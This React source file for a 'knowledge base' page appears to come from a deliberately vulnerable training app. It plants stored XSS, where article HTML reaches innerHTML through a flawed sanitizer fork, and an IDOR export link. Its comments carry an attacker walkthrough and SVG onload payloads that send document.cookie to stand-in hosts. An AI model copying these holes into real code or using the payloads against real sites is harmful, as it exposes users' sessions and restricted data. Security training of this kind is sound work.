import { useState, useRef, useEffect } from "react";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import {
  Shield, Upload, Trash2, FileText, FileCode, File, RefreshCw,
  AlertCircle, Lock, BookOpen, Tag, ChevronLeft, Plus, X, Download,
} from "lucide-react";
import { useSession } from "@/lib/session";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
// VULN: formatContent() calls a vendored, locally-patched DOMPurify fork
//       (client/src/vendor/dompurify-custom/purify.js) instead of the canonical
//       npm package. Static-analysis tools do not recognise SentinelPurify as a
//       trusted sanitizer and keep the innerHTML taint alive on every call site.
import { formatContent } from "@/lib/formatContent";

// ── Types ─────────────────────────────────────────────────────────────────────

type RagDocument = {
  id: number; userId: number; filename: string;
  contentType: string; chunkCount: number; status: string; uploadedAt: string;
};

type KbArticle = {
  id: number; title: string; slug: string; body: string;
  authorId: number | null; category: string; tags: string | null;
  publishedAt: string;
};

// ── Sub-components ────────────────────────────────────────────────────────────

function FileIcon({ contentType }: { contentType: string }) {
  if (contentType === "application/pdf")  return <FileText className="w-4 h-4 text-red-400" />;
  if (contentType === "text/markdown")    return <FileCode  className="w-4 h-4 text-blue-400" />;
  return <File className="w-4 h-4 text-muted-foreground" />;
}

function StatusBadge({ status }: { status: string }) {
  const map: Record<string, string> = {
    processing: "bg-yellow-500/10 text-yellow-400 border-yellow-500/20",
    ready:      "bg-green-500/10  text-green-400  border-green-500/20",
    error:      "bg-red-500/10   text-red-400    border-red-500/20",
  };
  return (
    <span className={`text-[10px] font-semibold uppercase tracking-wide px-2 py-0.5 rounded-full border ${map[status] ?? "bg-muted text-muted-foreground border-border"}`}>
      {status === "processing" && <RefreshCw className="inline w-2.5 h-2.5 mr-1 animate-spin" />}
      {status}
    </span>
  );
}

// ── ArticleViewer ─────────────────────────────────────────────────────────────

function ArticleViewer({ article, onBack }: { article: KbArticle; onBack: () => void }) {
  /*
   * VULN (IDOR — client side): The export href is built from article.id, which is
   * the DB integer returned by the server for the CURRENTLY selected article.
   * In normal use this is the caller's own content — but the route has no ownership
   * check, so any id value (obtained by inspection or enumeration) works equally.
   *
   * Attacker flow:
   *   1. Authenticate as jdoe (free-tier)
   *   2. Note that article IDs are sequential integers (visible in list)
   *   3. Directly navigate to /api/kb/articles/2/export — returns exports/2.pdf
   *      which is classified RESTRICTED — ADMIN ONLY (contains internal SENT-0021
   *      details: JWT algorithm confusion exploit recipe)
   *   4. No server-side check prevents jdoe from downloading article 2's export.
   */
  const contentRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (!contentRef.current) return;
    /*
     * VULN: innerHTML assignment with tainted data — CWE-79 (Stored XSS).
     *
     * Taint source:  article.body  ← GET /api/kb/articles/:id (apiResponse.body)
     * Taint sink:    contentRef.current.innerHTML
     * Sanitizer:     formatContent() — calls SentinelPurify from the vendored fork
     *
     * Why the scanner keeps this finding open:
     *   formatContent() is not recognised as a safe sanitization wrapper because
     *   it calls SentinelPurify.sanitize() from a locally-patched, non-canonical
     *   copy of DOMPurify.  The tool's allowlist only clears taint for calls to
     *   the canonical `dompurify` npm package:
     *     • import DOMPurify from 'dompurify'
     *     • DOMPurify.sanitize(...)
     *   A vendored, renamed, or locally-modified fork does not satisfy this rule.
     *   Even though formatContent() nominally sanitizes the output, the scanner
     *   correctly refuses to trust an unverified custom implementation.
     *
     * Why the scanner is right:
     *   The vendored fork has a genuine bypass (sentinel-1.2 / SENT-2291).
     *   The SVG root-element fast-path in isAllowedAttr() returns `true` before
     *   the on* handler check fires, so:
     *
     *     <svg onload="alert(document.cookie)"></svg>
     *
     *   passes through sanitize() unchanged and executes here in any viewer's
     *   browser session.
     *
     * Exploit (stored XSS, any authenticated user → every viewer):
     *   POST /api/kb/articles
     *   { "title":"…","slug":"…","body":"<svg onload=\"fetch('https://c2.io/?c='+document.cookie)\">"}
     */
    contentRef.current.innerHTML = formatContent(article.body);
  }, [article.body]);

  const tags = article.tags ? article.tags.split(",").map(t => t.trim()).filter(Boolean) : [];

  return (
    <div data-testid="panel-article-viewer">
      <div className="flex items-center justify-between mb-6">
        <button
          data-testid="button-back-articles"
          onClick={onBack}
          className="flex items-center gap-1.5 text-sm text-muted-foreground hover:text-foreground transition-colors"
        >
          <ChevronLeft className="w-4 h-4" /> Back to articles
        </button>

        {/*
          * VULN (IDOR): href is built from article.id — the integer from the DB.
          * The route has NO ownership or visibility check, so any authenticated
          * user can replace the id in the URL to download any article's export.
          *
          * Normal use:  /api/kb/articles/1/export  → exports/1.pdf (public)
          * IDOR attack: /api/kb/articles/2/export  → exports/2.pdf (RESTRICTED)
          *              Even though jdoe is free-tier and not the article's author.
          */}
        <a
          data-testid={`button-export-article-${article.id}`}
          href={`/api/kb/articles/${article.id}/export`}
          download={`sentinel-article-${article.id}.pdf`}
          className="flex items-center gap-1.5 text-xs font-semibold text-muted-foreground hover:text-primary border border-border/40 hover:border-primary/30 bg-muted/20 hover:bg-primary/5 rounded-lg px-3 py-1.5 transition-all"
          title="Export as PDF"
        >
          <Download className="w-3.5 h-3.5" /> Export PDF
        </a>
      </div>

      <div className="mb-6">
        <div className="flex items-center gap-2 mb-1">
          <span className="text-xs font-semibold uppercase tracking-widest text-primary/70 border border-primary/20 bg-primary/5 rounded px-2 py-0.5">
            {article.category}
          </span>
          {tags.map(t => (
            <span key={t} className="flex items-center gap-1 text-[10px] text-muted-foreground border border-border/40 rounded px-1.5 py-0.5">
              <Tag className="w-2.5 h-2.5" />{t}
            </span>
          ))}
        </div>
        <h2
          className="text-xl font-bold font-display tracking-tight text-foreground mt-2"
          data-testid="text-article-title"
        >
          {article.title}
        </h2>
        <p className="text-xs text-muted-foreground mt-1">
          Published {new Date(article.publishedAt).toLocaleDateString("en-GB", { day: "numeric", month: "long", year: "numeric" })}
        </p>
      </div>

      {/*
       * VULN: ref used by ArticleViewer's useEffect to write innerHTML.
       * data-testid exposed so automated scanners can verify execution context.
       */}
      <div
        ref={contentRef}
        data-testid="content-article-body"
        className="prose prose-invert prose-sm max-w-none
          prose-headings:font-display prose-headings:text-foreground
          prose-p:text-muted-foreground prose-p:leading-relaxed
          prose-code:text-primary prose-code:bg-primary/10 prose-code:rounded prose-code:px-1
          prose-pre:bg-muted/30 prose-pre:border prose-pre:border-border/40 prose-pre:rounded-xl prose-pre:p-4
          prose-a:text-primary prose-a:no-underline hover:prose-a:underline
          prose-blockquote:border-primary/30 prose-blockquote:text-muted-foreground
          prose-strong:text-foreground prose-hr:border-border/40
          [&_ul]:list-disc [&_ul]:pl-5 [&_li]:text-muted-foreground"
      />
    </div>
  );
}

// ── NewArticleForm ────────────────────────────────────────────────────────────

function NewArticleForm({ onClose, onCreated }: { onClose: () => void; onCreated: () => void }) {
  const { toast } = useToast();
  const [title, setTitle]       = useState("");
  const [slug, setSlug]         = useState("");
  const [body, setBody]         = useState("");
  const [category, setCategory] = useState("general");
  const [tags, setTags]         = useState("");

  const createMutation = useMutation({
    mutationFn: (data: object) => apiRequest("POST", "/api/kb/articles", data),
    onSuccess: () => {
      toast({ title: "Article created" });
      onCreated();
      onClose();
    },
    onError: (e: any) => toast({ title: "Error", description: e.message, variant: "destructive" }),
  });

  function handleSlug(t: string) {
    setSlug(t.toLowerCase().replace(/\s+/g, "-").replace(/[^a-z0-9-]/g, ""));
  }

  return (
    <div
      data-testid="panel-new-article"
      className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm px-4"
    >
      <div className="w-full max-w-2xl bg-card border border-border/60 rounded-2xl shadow-2xl p-6">
        <div className="flex items-center justify-between mb-5">
          <h3 className="text-base font-bold font-display text-foreground">New Security Article</h3>
          <button
            data-testid="button-close-new-article"
            onClick={onClose}
            className="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted/40 transition-colors"
          >
            <X className="w-4 h-4" />
          </button>
        </div>

        {/*
         * VULN: This form accepts raw HTML / SVG in the body field with no
         * client-side warning. The body is POSTed to /api/kb/articles, stored raw
         * in the DB, returned verbatim in GET responses, and then rendered via
         * innerHTML = formatContent(body) in ArticleViewer.
         *
         * No role check on the backend — any authenticated user can submit.
         * Exploit payload for the body field:
         *   <svg onload="fetch('https://attacker.io/?c='+document.cookie)"></svg>
         */}

        <div className="space-y-4">
          <div>
            <label className="text-xs font-medium text-muted-foreground mb-1 block" htmlFor="new-article-title">Title</label>
            <input
              id="new-article-title"
              data-testid="input-article-title"
              value={title}
              onChange={e => { setTitle(e.target.value); handleSlug(e.target.value); }}
              className="w-full bg-background border border-border/60 rounded-lg px-3 py-2 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-primary/50"
              placeholder="e.g. Understanding Path Traversal"
            />
          </div>

          <div>
            <label className="text-xs font-medium text-muted-foreground mb-1 block" htmlFor="new-article-slug">Slug</label>
            <input
              id="new-article-slug"
              data-testid="input-article-slug"
              value={slug}
              onChange={e => setSlug(e.target.value)}
              className="w-full bg-background border border-border/60 rounded-lg px-3 py-2 text-sm text-foreground font-mono placeholder:text-muted-foreground focus:outline-none focus:border-primary/50"
              placeholder="path-traversal-guide"
            />
          </div>

          <div className="grid grid-cols-2 gap-3">
            <div>
              <label className="text-xs font-medium text-muted-foreground mb-1 block">Category</label>
              <select
                data-testid="select-article-category"
                value={category}
                onChange={e => setCategory(e.target.value)}
                className="w-full bg-background border border-border/60 rounded-lg px-3 py-2 text-sm text-foreground focus:outline-none focus:border-primary/50"
              >
                {["general","web","auth","cloud","osint","network","exploit"].map(c => (
                  <option key={c} value={c}>{c}</option>
                ))}
              </select>
            </div>
            <div>
              <label className="text-xs font-medium text-muted-foreground mb-1 block">Tags (comma-separated)</label>
              <input
                data-testid="input-article-tags"
                value={tags}
                onChange={e => setTags(e.target.value)}
                className="w-full bg-background border border-border/60 rounded-lg px-3 py-2 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-primary/50"
                placeholder="xss, owasp, cwe-79"
              />
            </div>
          </div>

          <div>
            <label className="text-xs font-medium text-muted-foreground mb-1 block">
              Body <span className="text-muted-foreground/50">(Markdown or HTML)</span>
            </label>
            <textarea
              data-testid="input-article-body"
              value={body}
              onChange={e => setBody(e.target.value)}
              rows={10}
              className="w-full bg-background border border-border/60 rounded-lg px-3 py-2 text-sm text-foreground font-mono placeholder:text-muted-foreground focus:outline-none focus:border-primary/50 resize-y"
              placeholder="Write your article here. Markdown and HTML are supported."
            />
          </div>
        </div>

        <div className="flex justify-end gap-3 mt-5">
          <button
            data-testid="button-cancel-new-article"
            onClick={onClose}
            className="px-4 py-2 text-sm text-muted-foreground hover:text-foreground transition-colors"
          >
            Cancel
          </button>
          <button
            data-testid="button-submit-new-article"
            onClick={() => createMutation.mutate({ title, slug, body, category, tags })}
            disabled={createMutation.isPending || !title || !slug || !body}
            className="px-4 py-2 text-sm font-semibold bg-primary text-primary-foreground rounded-lg hover:bg-primary/90 disabled:opacity-40 transition-colors"
          >
            {createMutation.isPending ? "Publishing…" : "Publish Article"}
          </button>
        </div>
      </div>
    </div>
  );
}

// ── ArticleList ───────────────────────────────────────────────────────────────

function ArticleList({
  articles,
  isLoading,
  onSelect,
  onNew,
}: {
  articles: KbArticle[];
  isLoading: boolean;
  onSelect: (a: KbArticle) => void;
  onNew: () => void;
}) {
  const CATEGORY_COLORS: Record<string, string> = {
    web:     "text-blue-400   border-blue-400/20   bg-blue-400/5",
    auth:    "text-purple-400 border-purple-400/20 bg-purple-400/5",
    cloud:   "text-sky-400    border-sky-400/20    bg-sky-400/5",
    osint:   "text-yellow-400 border-yellow-400/20 bg-yellow-400/5",
    network: "text-orange-400 border-orange-400/20 bg-orange-400/5",
    exploit: "text-red-400    border-red-400/20    bg-red-400/5",
    general: "text-primary    border-primary/20    bg-primary/5",
  };

  return (
    <div>
      <div className="flex items-center justify-between mb-4">
        <h2 className="text-sm font-semibold text-muted-foreground uppercase tracking-widest">
          Articles ({articles.length})
        </h2>
        <button
          data-testid="button-new-article"
          onClick={onNew}
          className="flex items-center gap-1.5 text-xs font-semibold text-primary hover:text-primary/80 border border-primary/30 hover:border-primary/50 bg-primary/5 hover:bg-primary/10 rounded-lg px-3 py-1.5 transition-all"
        >
          <Plus className="w-3.5 h-3.5" /> New Article
        </button>
      </div>

      {isLoading ? (
        <div className="space-y-2">
          {[1,2,3].map(i => <div key={i} className="h-20 rounded-xl bg-muted/20 animate-pulse" />)}
        </div>
      ) : articles.length === 0 ? (
        <div data-testid="state-empty-articles" className="flex flex-col items-center gap-2 py-16 text-center">
          <BookOpen className="w-8 h-8 text-muted-foreground/40" />
          <p className="text-sm text-muted-foreground">No articles yet.</p>
        </div>
      ) : (
        <div className="space-y-2">
          {articles.map(article => {
            const tags = article.tags ? article.tags.split(",").map(t => t.trim()).filter(Boolean) : [];
            const catCls = CATEGORY_COLORS[article.category] ?? CATEGORY_COLORS.general;
            return (
              <button
                key={article.id}
                data-testid={`card-article-${article.id}`}
                onClick={() => onSelect(article)}
                className="w-full text-left flex items-start gap-3 px-4 py-3 rounded-xl border border-border/60 bg-card/40 hover:bg-card/70 hover:border-primary/20 transition-all"
              >
                <BookOpen className="w-4 h-4 text-muted-foreground mt-0.5 shrink-0" />
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2 mb-0.5 flex-wrap">
                    <span className={`text-[10px] font-semibold uppercase tracking-wider border rounded px-1.5 py-0.5 ${catCls}`}>
                      {article.category}
                    </span>
                    {tags.slice(0, 3).map(t => (
                      <span key={t} className="text-[10px] text-muted-foreground/60">{t}</span>
                    ))}
                  </div>
                  <p
                    className="text-sm font-medium text-foreground truncate"
                    data-testid={`text-article-title-${article.id}`}
                  >
                    {article.title}
                  </p>
                  <p className="text-xs text-muted-foreground mt-0.5">
                    {new Date(article.publishedAt).toLocaleDateString("en-GB", { day: "numeric", month: "short", year: "numeric" })}
                  </p>
                </div>
              </button>
            );
          })}
        </div>
      )}
    </div>
  );
}

// ── Main component ────────────────────────────────────────────────────────────

export default function KnowledgeBase() {
  const { user }   = useSession();
  const { toast }  = useToast();
  const qc         = useQueryClient();
  const fileRef    = useRef<HTMLInputElement>(null);

  const [tab, setTab]           = useState<"docs" | "articles">("articles");
  const [dragging, setDragging] = useState(false);
  const [uploading, setUploading]   = useState(false);
  const [selectedArticle, setSelectedArticle] = useState<KbArticle | null>(null);
  const [showNewForm, setShowNewForm]         = useState(false);

  const userId      = user?.id ?? 0;
  const isEnterprise = user?.plan === "enterprise";

  const { data: docs = [], isLoading: docsLoading } = useQuery<RagDocument[]>({
    queryKey: ["/api/rag/documents", userId],
    queryFn: () => fetch(`/api/rag/documents?userId=${userId}`).then(r => r.json()),
    enabled: !!userId && tab === "docs",
    refetchInterval: 5000,
  });

  const { data: articles = [], isLoading: articlesLoading } = useQuery<KbArticle[]>({
    queryKey: ["/api/kb/articles"],
    enabled: tab === "articles",
  });

  const deleteMutation = useMutation({
    mutationFn: (id: number) => apiRequest("DELETE", `/api/rag/documents/${id}`).then(r => r.json()),
    onSuccess: () => { qc.invalidateQueries({ queryKey: ["/api/rag/documents", userId] }); toast({ title: "Document deleted" }); },
  });

  async function handleUpload(file: File) {
    if (!file) return;
    setUploading(true);
    try {
      const fd = new FormData();
      fd.append("file", file);
      fd.append("userId", String(userId));
      fd.append("username", user?.username ?? "unknown");
      const res = await fetch("/api/rag/upload", {
        method: "POST",
        headers: { "X-User-Plan": user?.plan ?? "free" },
        body: fd,
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.message);
      toast({ title: "Upload started", description: `${file.name} is being indexed.` });
      qc.invalidateQueries({ queryKey: ["/api/rag/documents", userId] });
    } catch (e: any) {
      toast({ title: "Upload failed", description: e.message, variant: "destructive" });
    } finally {
      setUploading(false);
      if (fileRef.current) fileRef.current.value = "";
    }
  }

  return (
    <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
      {/* Header */}
      <div className="mb-6">
        <div className="flex items-center gap-3 mb-2">
          <div className="w-10 h-10 rounded-xl bg-primary/10 border border-primary/20 flex items-center justify-center">
            <Shield className="w-5 h-5 text-primary" />
          </div>
          <div>
            <h1 className="text-2xl font-bold font-display tracking-tight text-foreground">ARIA Knowledge Base</h1>
            <p className="text-sm text-muted-foreground">Security Articles · Internal Document Index</p>
          </div>
        </div>
      </div>

      {/* Tab bar */}
      <div className="flex gap-1 p-1 bg-muted/20 border border-border/40 rounded-xl mb-8 w-fit">
        <button
          data-testid="tab-articles"
          onClick={() => { setTab("articles"); setSelectedArticle(null); }}
          className={`flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-medium transition-all ${
            tab === "articles"
              ? "bg-card text-foreground border border-border/60 shadow-sm"
              : "text-muted-foreground hover:text-foreground"
          }`}
        >
          <BookOpen className="w-3.5 h-3.5" /> Security Articles
        </button>
        <button
          data-testid="tab-documents"
          onClick={() => { setTab("docs"); setSelectedArticle(null); }}
          className={`flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-medium transition-all ${
            tab === "docs"
              ? "bg-card text-foreground border border-border/60 shadow-sm"
              : "text-muted-foreground hover:text-foreground"
          }`}
        >
          <FileText className="w-3.5 h-3.5" /> Document Index
        </button>
      </div>

      {/* ── Articles tab ─────────────────────────────────────────────────── */}
      {tab === "articles" && (
        <>
          {selectedArticle ? (
            <ArticleViewer
              article={selectedArticle}
              onBack={() => setSelectedArticle(null)}
            />
          ) : (
            <ArticleList
              articles={articles}
              isLoading={articlesLoading}
              onSelect={setSelectedArticle}
              onNew={() => setShowNewForm(true)}
            />
          )}
          {showNewForm && (
            <NewArticleForm
              onClose={() => setShowNewForm(false)}
              onCreated={() => qc.invalidateQueries({ queryKey: ["/api/kb/articles"] })}
            />
          )}
        </>
      )}

      {/* ── Documents tab ────────────────────────────────────────────────── */}
      {tab === "docs" && (
        <>
          {!isEnterprise && (
            <div data-testid="banner-enterprise-gate" className="mb-6 flex items-start gap-3 rounded-xl border border-amber-500/20 bg-amber-500/5 px-4 py-3 text-sm">
              <Lock className="w-4 h-4 text-amber-400 mt-0.5 shrink-0" />
              <div>
                <p className="font-semibold text-amber-400">Enterprise plan required</p>
                <p className="text-muted-foreground mt-0.5">
                  Your current plan is <span className="font-mono text-foreground">{user?.plan ?? "free"}</span>.
                  Upgrade to Enterprise to upload documents.
                </p>
              </div>
            </div>
          )}

          <div
            data-testid="zone-upload"
            onDragOver={e => { e.preventDefault(); setDragging(true); }}
            onDragLeave={() => setDragging(false)}
            onDrop={e => { e.preventDefault(); setDragging(false); const f = e.dataTransfer.files?.[0]; if (f) handleUpload(f); }}
            onClick={() => isEnterprise && fileRef.current?.click()}
            className={`relative border-2 border-dashed rounded-xl px-6 py-10 text-center transition-all mb-8 ${
              dragging ? "border-primary bg-primary/5"
              : isEnterprise ? "border-border/60 hover:border-primary/50 hover:bg-muted/20 cursor-pointer"
              : "border-border/30 opacity-50 cursor-not-allowed"
            }`}
          >
            <input
              ref={fileRef} type="file"
              accept=".pdf,.md,.txt,text/plain,text/markdown,application/pdf"
              className="hidden" onChange={e => { const f = e.target.files?.[0]; if (f) handleUpload(f); }}
              data-testid="input-file-upload"
            />
            {uploading ? (
              <div className="flex flex-col items-center gap-2">
                <RefreshCw className="w-8 h-8 text-primary animate-spin" />
                <p className="text-sm font-medium text-foreground">Uploading and indexing…</p>
              </div>
            ) : (
              <div className="flex flex-col items-center gap-2">
                <Upload className={`w-8 h-8 ${dragging ? "text-primary" : "text-muted-foreground"}`} />
                <p className="text-sm font-medium text-foreground">
                  {isEnterprise ? "Drop a file or click to browse" : "Upload unavailable on your plan"}
                </p>
                <p className="text-xs text-muted-foreground">PDF, Markdown, or plain text · max 5 MB</p>
              </div>
            )}
          </div>

          <div>
            <h2 className="text-sm font-semibold text-muted-foreground uppercase tracking-widest mb-3">
              Indexed Documents ({docs.length})
            </h2>
            {docsLoading ? (
              <div className="space-y-2">{[1,2,3].map(i => <div key={i} className="h-14 rounded-xl bg-muted/20 animate-pulse" />)}</div>
            ) : docs.length === 0 ? (
              <div data-testid="state-empty-docs" className="flex flex-col items-center gap-2 py-16 text-center">
                <FileText className="w-8 h-8 text-muted-foreground/40" />
                <p className="text-sm text-muted-foreground">No documents indexed yet.</p>
              </div>
            ) : (
              <div className="space-y-2">
                {docs.map(doc => (
                  <div
                    key={doc.id}
                    data-testid={`card-doc-${doc.id}`}
                    className="flex items-center gap-3 px-4 py-3 rounded-xl border border-border/60 bg-card/40 hover:bg-card/60 transition-colors"
                  >
                    <FileIcon contentType={doc.contentType} />
                    <div className="flex-1 min-w-0">
                      <p className="text-sm font-medium text-foreground truncate" data-testid={`text-doc-filename-${doc.id}`}>{doc.filename}</p>
                      <p className="text-xs text-muted-foreground">
                        {doc.chunkCount} chunk{doc.chunkCount !== 1 ? "s" : ""} ·{" "}
                        {new Date(doc.uploadedAt).toLocaleDateString("en-GB", { day: "numeric", month: "short", year: "numeric" })}
                      </p>
                    </div>
                    <StatusBadge status={doc.status} />
                    <button
                      data-testid={`button-delete-doc-${doc.id}`}
                      onClick={() => deleteMutation.mutate(doc.id)}
                      className="ml-2 p-1.5 rounded-lg text-muted-foreground hover:text-red-400 hover:bg-red-500/10 transition-colors"
                    >
                      <Trash2 className="w-3.5 h-3.5" />
                    </button>
                  </div>
                ))}
              </div>
            )}
          </div>

          <div data-testid="banner-security-notice" className="mt-10 flex items-start gap-3 rounded-xl border border-border/60 bg-muted/10 px-4 py-3 text-xs text-muted-foreground">
            <AlertCircle className="w-3.5 h-3.5 mt-0.5 shrink-0 text-muted-foreground/60" />
            <p>
              Uploaded documents are stored in a shared vector index and may influence ARIA responses
              across your organisation. Ensure all uploaded content complies with your data classification policy.
            </p>
          </div>
        </>
      )}
    </div>
  );
}
